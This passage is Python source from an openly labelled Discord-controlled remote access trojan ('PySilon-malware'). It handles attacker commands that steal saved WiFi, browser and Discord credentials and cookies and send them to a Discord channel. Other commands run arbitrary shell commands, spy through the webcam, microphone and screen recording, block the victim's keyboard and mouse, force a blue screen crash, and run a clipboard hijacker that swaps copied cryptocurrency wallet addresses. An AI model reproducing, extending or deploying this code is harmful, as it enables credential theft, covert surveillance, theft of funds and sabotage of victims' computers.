                        #.log Removed cookies.txt (grabber.py:49)*
                    elif message.content[6:].lower() == 'wifi':
                        #.log Author requested for grabbing WiFi saved passwords (grabber.py:51)*
                        networks = force_decode(subprocess.run('netsh wlan show profile', capture_output=True, shell=True).stdout).strip()
                        #.log Obtained raw netsh data (grabber.py:53)*
                        polish_bytes = ['\\xa5', '\\x86', '\\xa9', '\\x88', '\\xe4', '\\xa2', '\\x98', '\\xab', '\\xbe', '\\xa4', '\\x8f', '\\xa8', '\\x9d', '\\xe3', '\\xe0', '\\x97', '\\x8d', '\\xbd']
                        polish_chars = ['ą', 'ć', 'ę', 'ł', 'ń', 'ó', 'ś', 'ź', 'ż', 'Ą', 'Ć', 'Ę', 'Ł', 'Ń', 'Ó', 'Ś', 'Ź', 'Ż']
                        for i in polish_bytes:
                            networks = networks.replace(i, polish_chars[polish_bytes.index(i)])
                        #.log Fetched polish characters (grabber.py:58)*
                        network_names_list = []
                        for profile in networks.split('\n'):
                            if ': ' in profile:
                                network_names_list.append(profile[profile.find(':')+2:].replace('\r', ''))
                        #.log Fetched profile data (grabber.py:63)*
                        result, password = {}, ''
                        for network_name in network_names_list:
                            command = 'netsh wlan show profile "' + network_name + '" key=clear'
                            current_result = force_decode(subprocess.run(command, capture_output=True, shell=True).stdout).strip()
                            #.log Obtained information about specific profile (grabber.py:68)*
                            for i in polish_bytes:
                                current_result = current_result.replace(i, polish_chars[polish_bytes.index(i)])
                                #.log Fetched polish characters in specific profile data (grabber.py:71)*
                            for line in current_result.split('\n'):
                                if 'Key Content' in line:
                                    password = line[line.find(':')+2:-1]
                                    #.log Grabbed password from specific profile data (grabber.py:75)*
                            result[network_name] = password
                        embed=discord.Embed(title='Grabbed WiFi passwords', color=0x0084ff)
                        for network in result.keys():
                            embed.add_field(name='🪪 ' + network, value='🔑 ' + result[network], inline=False)
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('📌')
                        #.log Sent embed with saved WiFi passwords (grabber.py:81)*
                    elif message.content[6:] == 'discord':
                        #.log Author requested for grabbing Discord accounts data (grabber.py:83)*
                        accounts = grab_discord.initialize(False)
                        #.log Grabbed Discord accounts data (grabber.py:85)*
                        for account in accounts:
                            reaction_msg = await message.channel.send(embed=account); await reaction_msg.add_reaction('📌') 
                            #.log Sent embed with Discord account data(grabber.py:88)*
                    elif message.content[6:] == 'all':
                        await message.channel.send('Grabbing everything... Please wait.')
                        try:
                            accounts = grab_discord.initialize(False)
                            #.log Grabbed Discord accounts data(grabber.py:93)*
                            for account in accounts:
                                reaction_msg = await message.channel.send(embed=account); await reaction_msg.add_reaction('📌') 
                                #.log Sent embed with Discord account data(grabber.py:96)*
                        except: pass
                        try:
                            result = grab_passwords()
                            #.log Grabbed passwords (grabber.py:100)*
                            embed=discord.Embed(title='Grabbed saved passwords', color=0x0084ff)
                            for url in result.keys():
                                embed.add_field(name='🔗 ' + url, value='👤 ' + result[url][0] + '\n🔑 ' + result[url][1], inline=False)
                            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('📌')
                            #.log Sent embed with all grabbed passwords(grabber.py:105)*
                        except: pass 
                        try:
                            await asyncio.sleep(1)
                            grab_cookies()
                            #.log Grabbed cookies(grabber.py:110)*
                            reaction_msg = await message.channel.send('```Grabbed cookies```', file=discord.File(f'C:\\Users\\{getuser()}\\cookies.txt', filename='cookies.txt')); await reaction_msg.add_reaction('📌')
                            #.log Sent message with grabbed cookies (grabber.py:112)*
                            subprocess.run(f'del C:\\Users\\{getuser()}\\cookies.txt', shell=True)
                        except: pass
            elif message.content == '.join':
                #.log Message is "join vc and stream microphone" (live_microphone.py:7)*
                await message.delete()
                #.log Removed the message (live_microphone.py:9)*
                vc = await client.get_channel(channel_ids['voice']).connect(self_deaf=True)
                #.log Connected to voice channel (live_microphone.py:11)*
                vc.play(PyAudioPCM())
                #.log Started playing audio from microphone\'s input (live_microphone.py:13)*
                await message.channel.send('`[' + current_time() + '] Joined voice-channel and streaming microphone in realtime`')
                #.log Sent message about joining the voice channel (live_microphone.py:15)*
            elif message.content[:5] == '.show':
                #.log Message is "show" (process.py:60)*
                await message.delete()
                #.log Removed the message (process.py:62)*
                if message.content.strip() == '.show':
                    #.log Author issued empty ".show" (process.py:64)*
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .show <what-to-show>```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent message with usage of ".show" (process.py:68)*
                else:
                    if message.content[6:] == 'processes':
                        #.log Author requested to list running processes (process.py:71)*
                        processes, processes_list = [], []
                        for proc in process_iter():
                            processes.append(proc.name())
                        #.log Obtained information about running processes (process.py:75)*
                        processes.sort(key=str.lower)
                        #.log Sorted the processes list (process.py:77)*
                        how_many, temp = 1, processes[0]; processes.pop(0)
                        for i in processes:
                            if temp == i: how_many += 1
                            else:
                                if how_many == 1: processes_list.append('``' + temp + '``')
                                else: processes_list.append('``' + temp + '``   [x' + str(how_many) + ']'); how_many = 1
                                temp = i
                        #.log Formatted processes names to show how many duplicates are there (process.py:85)*
                        total_processes = len(processes)
                        #.log Calculated amount of running processes (process.py:87)*
                        processes = ''
                        reaction_msg = await message.channel.send('```Processes at ' + current_time() + ' requested by ' + str(message.author) + '```')
                        #.log Sent header message of processes list (process.py:90)*
                        processes_messages.append(reaction_msg)
                        for proc in range(1, len(processes_list)):
                            if len(processes) < 1800:
                                processes = processes + '\n**' + str(proc) + ') **' + str(processes_list[proc])
                                #.log List of running processes is below 1800 characters. PySilon won\'t divide it (process.py:95)*
                            else:
                                #.log List of running processes is above 1800 characters. PySilon will divide it into smaller pieces (process.py:97)*
                                processes += '\n**' + str(proc) + ') **' + str(processes_list[proc])
                                reaction_msg = await message.channel.send(processes)
                                #.log Sent a piece of processes list (process.py:100)*
                                processes_messages.append(reaction_msg)
                                processes = ''
                        reaction_msg = await message.channel.send(processes + '\n Total processes:** ' + str(total_processes) + '**\n```If you want to kill a process, type  .kill <process-number>```')
                        #.log Sent footer message of processes list (process.py:104)*
                        processes_messages.append(reaction_msg)
                        await reaction_msg.add_reaction('🔴')
            elif message.content == '.foreground':
                #.log Message is "get foreground window process name" (process.py:108)*
                await message.delete()
                #.log Removed the message (process.py:110)*
                foreground_process = active_window_process_name()
                if foreground_process == None:
                    #.log Failed to get foreground window process name (process.py:113)*
                    embed = discord.Embed(title="📛 Error",description='```Failed to get foreground window process name.```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent message about failure (process.py:117)*
                else:
                    #.log Successfully obtained foreground window process name (process.py:119)*
                    embed = discord.Embed(title=str(foreground_process),description=f'```You can kill it with -> .kill {foreground_process}```', colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent message with the process name (process.py:123)*
            elif message.content[:10] == '.blacklist':
                await message.delete()
                if message.content.strip() == '.blacklist':
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .blacklist <process-name>```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    if not os.path.exists(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln'): 
                        with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8'): pass
                    with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
                        disabled_processes_list = disabled_processes.readlines()
                    for x, y in enumerate(disabled_processes_list): disabled_processes_list[x] = y.replace('\n', '')
                    if message.content[11:] not in disabled_processes_list:
                        disabled_processes_list.append(message.content[11:])
                        with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8') as disabled_processes:
                            disabled_processes.write('\n'.join(disabled_processes_list))
                        embed = discord.Embed(title="🟢 Success",description=f'```{message.content[11:]} has been added to process blacklist```', colour=discord.Colour.green())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    else:
                        embed = discord.Embed(title="📛 Error",description='```This process is already blacklisted, so there\'s nothing to disable```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif message.content[:10] == '.whitelist':
                await message.delete()
                if message.content.strip() == '.whitelist':
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .whitelist <process-name>```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    if not os.path.exists(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln'): 
                        with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8'): pass
                    with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
                        disabled_processes_list = disabled_processes.readlines()
                    for x, y in enumerate(disabled_processes_list): disabled_processes_list[x] = y.replace('\n', '')
                    if message.content[11:] in disabled_processes_list:
                        disabled_processes_list.pop(disabled_processes_list.index(message.content[11:]))
                        with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8') as disabled_processes:
                            disabled_processes.write('\n'.join(disabled_processes_list))
                        embed = discord.Embed(title="🟢 Success",description=f'```{message.content[11:]} has been removed from process blacklist```', colour=discord.Colour.green())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    else:
                        embed = discord.Embed(title="📛 Error",description='```This process is not blacklisted```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif message.content[:5] == '.kill':
                #.log Message is "kill a process" (process.py:171)*
                await message.delete()
                #.log Removed the message (process.py:173)*
                if message.content.strip() == '.kill':
                    #.log Author issued empty ".kill" (process.py:175)*
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .kill <process-name-or-ID>```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent message with usage of ".kill" (process.py:179)*
                elif check_int(message.content[6:]):
                    #.log Argument is integer (process.py:181)*
                    if len(processes_list) > 10:
                        #.log Process list is generated (process.py:183)*
                        #.log Checking if there is a process with provided process ID (process.py:184)*
                        if int(message.content[6:]) < len(processes_list) and int(message.content[6:]) > 0:
                            #.log Found a process with provided process ID (process.py:186)*
                            reaction_msg = await message.channel.send('```Do you really want to kill process: ' + processes_list[int(message.content[6:])].replace('`', '') + '\nReact with 💀 to kill it or 🔴 to cancel...```')
                            #.log Sent message with confirmation of killing a process (process.py:188)*
                            process_to_kill = [processes_list[int(message.content[6:])].replace('`', ''), False]
                            await reaction_msg.add_reaction('💀')
                            #.log Reacted with "kill" (process.py:191)*
                            await reaction_msg.add_reaction('🔴')
                            #.log Reacted with "cancel" (process.py:193)*
                        else:
                            #.log Couldn\'t find any process with provided process ID (process.py:195)*
                            embed = discord.Embed(title="📛 Error",description="```There isn't any process with that index. Range of process indexes is 1-" + str(len(processes_list)-1) + '```', colour=discord.Colour.red())
                            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                            #.log Sent message about wrong process ID (process.py:199)*
                    else:
                        #.log Processes list is not generated (process.py:201)*
                        embed = discord.Embed(title="📛 Error",description='```You need to generate the processes list to use this feature\n.show processes```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                        #.log Sent message about missing process list (process.py:205)*
                elif message.content[6:].lower() in [proc.name().lower() for proc in process_iter()]:
                    #.log Process list is not generated, but valid process name is provided (process.py:207)*
                    stdout = force_decode(subprocess.run(f'taskkill /f /IM {message.content[6:].lower()} /t', capture_output=True, shell=True).stdout).strip()
                    #.log Tried to kill provided process (process.py:209)*
                    await asyncio.sleep(0.5)
                    if message.content[6:].lower() not in [proc.name().lower() for proc in process_iter()]:
                        #.log Process is not running anymore (process.py:212)*
                        embed = discord.Embed(title="🟢 Success",description=f'```Successfully killed {message.content[6:].lower()}```', colour=discord.Colour.green())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                        #.log Sent message about successfull kill (process.py:216)*
                    else:
                        #.log Process is still running (process.py:218)*
                        embed = discord.Embed(title="📛 Error",description=f'```Tried to kill {message.content[6:]} but it\'s still running...```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                        #.log Sent message about unsuccessfull kill (process.py:222)*
                else:
                    #.log Processes list is not generated (process.py:224)*
                    embed = discord.Embed(title="📛 Error",description='```Invalid process name/ID. You can view all running processes by typing:\n.show processes```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent message about missing process list (process.py:228)*
            elif message.content[:4] == '.cmd':
                #.log Message is "run a command" (reverse_shell.py:15)*
                await message.delete()
                #.log Removed the message (reverse_shell.py:17)*
                if message.content.strip() == '.cmd':
                    #.log Author issued empty .cmd command (reverse_shell.py:19)*
                    reaction_msg = await message.channel.send('```Syntax: .cmd <command>```'); await reaction_msg.add_reaction('🔴')
                    #.log Sent message with usage of ".cmd" (reverse_shell.py:21)*
                else:
                    cmd_output = force_decode(subprocess.run(message.content[5:], capture_output= True, shell= True).stdout).strip()
                    #.log Executed a CMD command (reverse_shell.py:24)*
                    message_buffer, cmd_messages = '', []
                    reaction_msg = await message.channel.send('```Executed command: ' + message.content[5:] + '\nstdout:```'); cmd_messages.append(reaction_msg)
                    #.log Sent header message of CMD stdout (reverse_shell.py:27)*
                    for line in range(1, len(cmd_output.split('\n'))):
                        if len(message_buffer) + len(cmd_output.split('\n')[line]) > 1950:
                            reaction_msg = await message.channel.send('```' + message_buffer + '```'); cmd_messages.append(reaction_msg)
                            #.log Sent part of CMD stdout (reverse_shell.py:31)*
                            message_buffer = cmd_output.split('\n')[line]
                        else:
                            message_buffer += cmd_output.split('\n')[line] + '\n'
                    reaction_msg = await message.channel.send('```' + message_buffer + '```'); cmd_messages.append(reaction_msg)
                    #.log Sent CMD stdout (last part or whole) (reverse_shell.py:36)*
                    reaction_msg = await message.channel.send('```End of command stdout```'); await reaction_msg.add_reaction('🔴')
                    #.log Sent footer message of CMD stdout (reverse_shell.py:38)*
            elif message.content[:8] == '.execute':
                #.log Message is "execute a file" (reverse_shell.py:40)*
                await message.delete()
                #.log Removed the message (reverse_shell.py:42)*
                if message.channel.id == channel_ids['file']:
                    #.log Message channel is file-related (reverse_shell.py:44)*
                    if message.content.strip() == '.execute':
                        #.log Author issued empty ".execute" (reverse_shell.py:46)*
                        reaction_msg = await message.channel.send('```Syntax: .execute <filename>```'); await reaction_msg.add_reaction('🔴')
                        #.log Sent message with usage of ".execute" (reverse_shell.py:48)*
                    else:
                        if os.path.exists('/'.join(working_directory) + '/' + message.content[9:]):
                            #.log Requested file-to-execute does exist on this PC (reverse_shell.py:51)*
                            try:
                                #.log Trying to execute the file (reverse_shell.py:53)*
                                file_extension = os.path.splitext(message.content[9:])[1]
                                subprocess.run('start "" "' + '/'.join(working_directory) + '/' + message.content[9:] + '"', shell=True)
                                #.log Executed the files (reverse_shell.py:56)*
                                await asyncio.sleep(1)
                                ImageGrab.grab(all_screens=True).save('ss.png')
                                #.log Saved a screenshot of this PCs screen (reverse_shell.py:59)*
                                reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[Executed: ' + '/'.join(working_directory) + '/' + message.content[9:] + ']`').set_image(url='attachment://ss.png'), file=discord.File('ss.png')); await reaction_msg.add_reaction('📌')
                                #.log Sent embed with screenshot of this PC (reverse_shell.py:61)*
                                subprocess.run('del ss.png', shell=True)
                                #.log Removed the screenshot (reverse_shell.py:63)*
                                await message.channel.send('```Successfully executed: ' + message.content[9:] + '```')
                                #.log Sent message about success of execution (reverse_shell.py:65)*
                            except Exception as e:
                                #.log Error occurred while trying to execute the file (reverse_shell.py:67)*
                                reaction_msg = await message.channel.send(f'```❗ Something went wrong...```\n{str(e)}'); await reaction_msg.add_reaction('🔴')
                                #.log Sent message about the error with more details (reverse_shell.py:69)*
                        else:
                            #.log Requested file-to-execute does not exist on this PC (reverse_shell.py:71)*
                            reaction_msg = await message.channel.send('```❗ File or directory not found.```'); await reaction_msg.add_reaction('🔴')
                            #.log Sent message about the missing file (reverse_shell.py:73)*
                else:
                    #.log Message channel is not file-related (reverse_shell.py:75)*
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
                    #.log Sent message about wrong channel (reverse_shell.py:77)*
            elif message.content[:7] == '.webcam':
                #.log Message is "webcam" (webcam.py:7)*
                await message.delete()
                #.log Removed the message (webcam.py:9)*
                if message.content.strip() == '.webcam':
                    #.log Author issued empty ".webcam" command (webcam.py:11)*
                    reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```')
                    #.log Sent message with usage of ".webcam" (webcam.py:13)*
                    await reaction_msg.add_reaction('🔴')
                else:
                    if message.content[8:] == 'photo':
                        #.log Author requested for a photo from webcam (webcam.py:17)*
                        pygame.camera.init()
                        #.log Initialized camera with PyGame (webcam.py:19)*
                        cameras = pygame.camera.list_cameras()
                        #.log Got a list of available cameras (webcam.py:21)*
                        if not cameras:
                            #.log No cameras found (webcam.py:23)*
                            reaction_msg = await message.channel.send('No cameras found.')
                            #.log Sent message about missing cameras. Aborting the operation (webcam.py:25)*
                            await reaction_msg.add_reaction('🔴')
                            return
                        camera = pygame.camera.Camera(cameras[0])
                        #.log Selected the default camera (webcam.py:29)*
                        camera.start()
                        time.sleep(1)
                        #.log Started camera intercepting (webcam.py:32)*
                        image = camera.get_image()
                        #.log Took image from camera (webcam.py:34)*
                        camera.stop()
                        #.log Stopped camera intercepting (webcam.py:36)*
                        pygame.image.save(image, f'C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png')
                        #.log Saved image from the camera (webcam.py:38)*
                        reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time(True) + ' `[On demand]`').set_image(url='attachment://webcam.png'),file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png'))
                        #.log Sent embed with image from camera (webcam.py:40)*
                        await reaction_msg.add_reaction('📌')
                        #.log Reacted with "pin" (webcam.py:42)*
                        subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png', shell=True)
                        #.log Removed image from camera (webcam.py:44)*
                    else:
                        #.log Author provided invalid argument for this command (webcam.py:46)*
                        reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```')
                        #.log Sent message with usage of ".webcam" (webcam.py:48)*
                        await reaction_msg.add_reaction('🔴')
            elif message.content == '.screenrec':
                #.log Message is "record screen" (screenrec.py:7)*
                await message.delete()
                #.log Removed the message (screenrec.py:9)*
                await message.channel.send("`Recording... Please wait.`")
                #.log Sent message about recording start (screenrec.py:11)*
                output_file = f'C:\\Users\\{getuser()}\\{software_directory_name}\\recording.mp4'
                screen_width, screen_height = pyautogui.size()
                screen_region = (0, 0, screen_width, screen_height)
                frames = []
                duration = 15
                fps = 30
                num_frames = duration * fps
                start_time = time.time()
                #.log Calculated required frames to record (screenrec.py:20)*
                try:
                    #.log Trying to record the screen for 15 seconds (screenrec.py:22)*
                    for _ in range(num_frames):
                        img = pyautogui.screenshot(region=screen_region)
                        frame = np.array(img)
                        frames.append(frame)
                    imageio.mimsave(output_file, frames, fps=fps, quality=8)
                    #.log Saved the recording (screenrec.py:28)*
                    reaction_msg = await message.channel.send("Screen Recording `[On demand]`", file=discord.File(output_file))
                    #.log Sent message with recording (screenrec.py:30)*
                    await reaction_msg.add_reaction('📌')
                    #.log Reacted with "pin" (screenrec.py:32)*
                    subprocess.run(f'del {output_file}', shell=True)
                    #.log Removed the recording (screenrec.py:34)*
                except Exception as e:
                    #.log Error occurred while trying to record the screen (screenrec.py:36)*
                    embed = discord.Embed(title="📛 Error",description="An error occurred during screen recording.", colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await message.channel.send(embed=embed)
                    #.log Sent embed about the error with more details (screenrec.py:40)*
            elif message.content == '.block-input':
                #.log Message is "block input" (block_input.py:4)*
                if not input_blocked:
                    #.log Input is not already blocked (block_input.py:6)*
                    await message.delete()
                    #.log Removed the message (block_input.py:8)*
                    async def on_press():
                        pass
                    async def on_release():
                        pass
                    async def on_click():
                        pass
                    keyboard_listener = keyboard.Listener(suppress=True)
                    #.log Created keyboard listener (block_input.py:16)*
                    mouse_listener = mouse.Listener(suppress=True)
                    #.log Created mouse listener (block_input.py:18)*
                    keyboard_listener.start()
                    #.log Disabled keyboard (block_input.py:20)*
                    mouse_listener.start()
                    #.log Disabled mouse (block_input.py:22)*
                    embed = discord.Embed(title="🚫 Input Blocked",description=f'```Input has been blocked. Unblock it by using .unblock-input```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await message.channel.send(embed=embed)
                    #.log Sent embed about blocked input (block_input.py:26)*
                    input_blocked = True
                else:
                    #.log Input is already blocked (block_input.py:29)*
                    embed = discord.Embed(title="🔴 Hold on!",description=f'```The input is already blocked. Unblock it by using .unblock-input```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await message.channel.send(embed=embed)
                    #.log Sent embed about already blocked input (block_input.py:33)*
            elif message.content == '.unblock-input':
                #.log Message is "unblock input" (block_input.py:35)*
                if input_blocked:
                    #.log Input is blocked (block_input.py:37)*
                    await message.delete()
                    #.log Removed the message (block_input.py:39)*
                    keyboard_listener.stop()
                    #.log Unblocked keyboard (block_input.py:41)*
                    mouse_listener.stop()
                    #.log Unblocked mouse (block_input.py:43)*
                    embed = discord.Embed(title="🟢 Input Unblocked",description=f'```Input has been unblocked. Block it by using .block-input```', colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await message.channel.send(embed=embed)
                    #.log Sent embed about unblocked input (block_input.py:47)*
                    input_blocked = False
                else:
                    #.log Input is not blocked (block_input.py:50)*
                    embed = discord.Embed(title="🔴 Hold on!",description=f'```The input is not blocked. Block it by using .block-input```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await message.channel.send(embed=embed)
                    #.log Sent embed about unblocked input (block_input.py:54)*
            elif message.content == '.bsod':
                #.log Message is "Blue Screen of Death" (bsod.py:4)*
                await message.delete()
                #.log Removed the message (bsod.py:6)*
                await message.channel.send("```Attempting to trigger a BSoD...```")
                #.log Sent message about trying to BSoD (bsod.py:8)*
                #.log Trying to trigger BSoD (bsod.py:9)*
                nullptr = ctypes.POINTER(ctypes.c_int)()
                ctypes.windll.ntdll.RtlAdjustPrivilege(
                    ctypes.c_uint(19), 
                    ctypes.c_uint(1), 
                    ctypes.c_uint(0), 
                    ctypes.byref(ctypes.c_int())
                )
                ctypes.windll.ntdll.NtRaiseHardError(
                    ctypes.c_ulong(0xC000007B), 
                    ctypes.c_ulong(0), 
                    nullptr, 
                    nullptr, 
                    ctypes.c_uint(6),
                   ctypes.byref(ctypes.c_uint())
                )
            elif message.content == '.start-clipper':
                #.log Message is "start crypto clipper" (crypto_clipper.py:8)*
                if clipper_stop:
                    #.log Clipper is not running (crypto_clipper.py:10)*
                    await message.delete()
                    #.log Removed the message (crypto_clipper.py:12)*
                    clipper_stop = False
                    script_dir = os.path.dirname(os.path.abspath(__file__))
                    #.log Fetched the script directory (crypto_clipper.py:15)*
                    config_path = os.path.join(script_dir, 'crypto_clipper.json')
                    #.log Fetched the configuration path (crypto_clipper.py:17)*
                    with open(config_path) as f:
                        addresses = json.load(f)
                    #.log Fetched the configuration (crypto_clipper.py:20)*
                    def match():
                        clipboard = str(pyperclip.paste())
                        #.log Fetched the clipboard content (crypto_clipper.py:23)*
                        btc_match = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", clipboard)
                        eth_match = re.match("^0x[a-zA-F0-9]{40}$", clipboard)
                        doge_match = re.match("^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$", clipboard)
                        ltc_match = re.match("^([LM3]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}||ltc1[a-z0-9]{39,59})$", clipboard)
                        xmr_match = re.match("^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", clipboard)
                        bch_match = re.match("^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$", clipboard)
                        dash_match = re.match("^X[1-9A-HJ-NP-Za-km-z]{33}$", clipboard)
                        trx_match = re.match("^T[A-Za-z1-9]{33}$", clipboard)
                        xrp_match = re.match("^r[0-9a-zA-Z]{33}$", clipboard)
                        xlm_match = re.match("^G[0-9A-Z]{40,60}$", clipboard)
                        #.log Tried to match address RegEx (crypto_clipper.py:34)*
                        for currency, address in addresses.items():
                            if eval(f'{currency.lower()}_match'):
                                if address and address != clipboard:
                                    #.log Matched address with crypto RegEx (crypto_clipper.py:38)*
                                    pyperclip.copy(address)
                                    #.log Switched the copied address into other one (crypto_clipper.py:40)*
                                break
                    def wait_for_paste():
                        while not clipper_stop:
                            pyperclip.waitForNewPaste()
                            #.log New text copied (crypto_clipper.py:45)*
                            match()
                    thread = threading.Thread(target=wait_for_paste)
                    #.log Created the Clipper thread (crypto_clipper.py:48)*
                    thread.start()
                    #.log Started the Clipper (crypto_clipper.py:50)*
                    embed = discord.Embed(title="🟢 Crypto Clipper started!",description=f'```Crypto Clipper has been started! Stop it by using .stop-clipper```', colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await message.channel.send(embed=embed)
                    #.log Sent embed about Clipper startup (crypto_clipper.py:54)*
                else:
                    #.log Clipper is already running (crypto_clipper.py:56)*
                    await message.delete()
                    #.log Removed the message (crypto_clipper.py:58)*
                    embed = discord.Embed(title="🔴 Hold on!",description=f'```Crypto Clipper is already running! Stop it by using .stop-clipper```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await message.channel.send(embed=embed)
                    #.log Sent embed about Clipper already running (crypto_clipper.py:62)*
            elif message.content == '.stop-clipper':
                #.log Message is "stop crypto clipper" (crypto_clipper.py:65)*
                await message.delete()
                #.log Removed the message (crypto_clipper.py:67)*
                if not clipper_stop:
                    #.log Clipper is running (crypto_clipper.py:69)*
                    thread.join()
                    #.log Stopped Clipper (crypto_clipper.py:71)*
                    embed = discord.Embed(title="🔴 Crypto Clipper stopped!",description=f'```Crypto Clipper has been stopped! Start it using .start-clipper```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
